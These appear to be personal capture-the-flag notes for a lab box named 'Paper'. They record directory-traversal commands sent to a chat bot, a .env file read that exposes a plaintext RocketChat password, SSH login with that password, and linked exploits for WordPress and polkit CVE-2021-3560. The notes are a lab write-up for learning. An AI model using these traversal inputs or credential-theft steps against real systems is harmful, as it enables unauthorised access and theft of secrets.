@@ -1,0 +1,140 @@
+port 80 , 443
+
+//port 80, response header, add it to hosts
+//burp to check response header, we may get domainname
+
+office.paper
+
+
+//vunl of wp cersion 5.3.2
+https://www.exploit-db.com/exploits/35257
+
+http://office.paper/?static=1&order=desc
+
+# Secret Registration URL of new Employee chat system
+
+http://chat.office.paper/register/8qozr226AhkCHZdyY
+
+//use the help of robot, some commans we can execute
+
+  3. Files:
+  eg: 'recyclops get me the file test.txt', or 'recyclops could you send me the file sale/secret.xls' or just 'recyclops file test.txt'
+  4. List:
+  You can ask me to list the files
+  eg: 'recyclops i need directory list sale' or just 'recyclops list sale'
+
+
+//check vuln to LFI, check the passwd file, get a user dwight
+
+recyclops list ../../../../../home/
+
+Fetching the directory listing of ../../../../../home
+total 0
+drwxr-xr-x. 3 root root 20 Jan 14 2022 .
+dr-xr-xr-x. 17 root root 244 Jan 17 2022 ..
+drwx------ 11 dwight dwight 281 Feb 6 2022 dwight
+Fetching the directory listing of ../../../../../home/dwight
+total 32
+drwx------ 11 dwight dwight 281 Feb 6 2022 .
+drwxr-xr-x. 3 root root 20 Jan 14 2022 ..
+lrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history -> /dev/null
+-rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout
+-rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile
+-rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc
+-rwxr-xr-x 1 dwight dwight 1174 Sep 16 2021 bot_restart.sh
+drwx------ 5 dwight dwight 56 Jul 3 2021 .config
+-rw------- 1 dwight dwight 16 Jul 3 2021 .esd_auth
+drwx------ 2 dwight dwight 44 Jul 3 2021 .gnupg
+drwx------ 8 dwight dwight 4096 Sep 16 2021 hubot
+-rw-rw-r-- 1 dwight dwight 18 Sep 16 2021 .hubot_history
+drwx------ 3 dwight dwight 19 Jul 3 2021 .local
+drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla
+drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm
+drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales
+drwx------ 2 dwight dwight 6 Sep 16 2021 .ssh
+-r-------- 1 dwight dwight 33 Dec 8 09:59 user.txt
+drwxr-xr-x 2 dwight dwight 24 Sep 16 2021 .vim
+
+
+
+recyclops list ../../../../../home/dwight/hubot
+
+Fetching the directory listing of ../../../../../home/dwight/hubot
+total 692
+drwx------ 8 dwight dwight 4096 Sep 16 2021 .
+drwx------ 11 dwight dwight 281 Feb 6 2022 ..
+-rw-r--r-- 1 dwight dwight 0 Jul 3 2021 \
+srwxr-xr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8000
+srwxrwxr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8080
+drwx--x--x 2 dwight dwight 36 Sep 16 2021 bin
+-rw-r--r-- 1 dwight dwight 258 Sep 16 2021 .env
+-rwxr-xr-x 1 dwight dwight 2 Jul 3 2021 external-scripts.json
+drwx------ 8 dwight dwight 163 Jul 3 2021 .git
+-rw-r--r-- 1 dwight dwight 917 Jul 3 2021 .gitignore
+-rw-r--r-- 1 dwight dwight 340660 Dec 9 00:11 .hubot.log
+-rwxr-xr-x 1 dwight dwight 1068 Jul 3 2021 LICENSE
+drwxr-xr-x 89 dwight dwight 4096 Jul 3 2021 node_modules
+drwx--x--x 115 dwight dwight 4096 Jul 3 2021 node_modules_bak
+-rwxr-xr-x 1 dwight dwight 1062 Sep 16 2021 package.json
+-rwxr-xr-x 1 dwight dwight 972 Sep 16 2021 package.json.bak
+-rwxr-xr-x 1 dwight dwight 30382 Jul 3 2021 package-lock.json
+-rwxr-xr-x 1 dwight dwight 14 Jul 3 2021 Procfile
+-rwxr-xr-x 1 dwight dwight 5044 Jul 3 2021 README.md
+drwx--x--x 2 dwight dwight 193 Jan 13 2022 scripts
+-rwxr-xr-x 1 dwight dwight 100 Jul 3 2021 start_bot.sh
+drwx------ 2 dwight dwight 25 Jul 3 2021 .vscode
+-rwxr-xr-x 1 dwight dwight 29951 Jul 3 2021 yarn.lock
+
+
+recyclops file ../../../../../home/dwight/hubot/.env
+
+export ROCKETCHAT_URL='http://127.0.0.1:48320'
+export ROCKETCHAT_USER=recyclops
+export ROCKETCHAT_PASSWORD=Queenofblad3s!23
+export ROCKETCHAT_USESSL=false
+export RESPOND_TO_DM=true
+export RESPOND_TO_EDITED=true
+export PORT=8000
+export BIND_ADDRESS=127.0.0.1
+export ROCKETCHAT_URL='http://127.0.0.1:48320'
+export ROCKETCHAT_USER=recyclops
+export ROCKETCHAT_PASSWORD=Queenofblad3s!23
+export ROCKETCHAT_USESSL=false
+export RESPOND_TO_DM=true
+export RESPOND_TO_EDITED=true
+export PORT=8000
+export BIND_ADDRESS=127.0.0.1
+
+//use this passwd to ssh dwight
+└─$ ssh dwight@10.10.11.143
+The authenticity of host '10.10.11.143 (10.10.11.143)' can't be established.
+ED25519 key fingerprint is SHA256:9utZz963ewD/13oc9IYzRXf6sUEX4xOe/iUaMPTFInQ.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.143' (ED25519) to the list of known hosts.
+dwight@10.10.11.143's password: 
+Activate the web console with: systemctl enable --now cockpit.socket
+
+Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
+[dwight@paper ~]$ id
+uid=1004(dwight) gid=1004(dwight) groups=1004(dwight)
+
+[dwight@paper ~]$ rpm -qa polkit
+polkit-0.115-6
+
+//run linpeas, Vulnerable to CVE-2021-3560
+
+https://www.exploit-db.com/exploits/50011
+
+
+[hacked@paper sales]$ whoami
+hacked
+[hacked@paper sales]$ id
+uid=1005(hacked) gid=1005(hacked) groups=1005(hacked),10(wheel)
+sudo su
+
+
+//lesson learned
+  > use burp get response header to get domain name
+  > check version of running apps services
+  > linpeas red workd and yellow banner words
